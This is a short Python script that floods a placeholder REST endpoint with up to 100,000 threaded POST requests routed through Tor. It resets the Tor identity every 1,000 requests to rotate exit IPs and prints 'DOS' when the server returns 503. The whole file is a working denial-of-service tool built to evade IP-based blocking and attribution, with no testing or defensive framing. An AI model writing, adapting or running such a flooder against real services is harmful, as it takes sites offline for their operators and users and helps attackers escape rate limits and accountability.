# Add C:\...\Tor Browser\Browser\TorBrowser\Tor to the current user's environment variables (Windows 10)
import threading
from random import randint, random

from torrequest import TorRequest
import time
from datetime import datetime
import requests
import json
import sys

from urllib3.exceptions import NewConnectionError, ProtocolError


def get_current_time():
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    # print("Current Time =", current_time)
    return current_time


def func5(data, i):
    try:
        resp = tr.post("https://rest_server/api/rest_func", json=data)
        print(get_current_time() + ":(" + str(i) + ")):" + str(resp.status_code) + " " + str(resp.elapsed.microseconds) + "µs")
        if resp.status_code == 503:
            print("DOS")
    except ProtocolError:
        print(get_current_time() + ":func5: ProtocolError")
        pass
    except TimeoutError:
        print(get_current_time() + ":func5: TimeoutError")
        pass
    except ConnectionError:
        print(get_current_time() + ":func5: ConnectionError")
        pass
    except NewConnectionError:
        print(get_current_time() + ":func5: NewConnectionError")
        pass
    except:
        print(get_current_time() + ":func5: exception: " + str(sys.exc_info()[1]))
        pass


if __name__ == '__main__':
    print('Python + TOR')

with TorRequest(proxy_port=9150, ctrl_port=9151, password=None) as tr:

    resp = tr.get('http://www.ipecho.net/plain')
    print("Current IP : " + resp.text)

    index_reset = 0

    for i in range(100000):

        index_reset = index_reset+1
        if index_reset > 1000:
            index_reset = 0
            tr.reset_identity()
            resp = tr.get('http://www.ipecho.net/plain')
            print("Current IP : " + resp.text)

        data = {}
        data['yourjsonkey'] = "yourjsonvalue"
        t = threading.Thread(target=func5, args=(data, i))
        t.start()



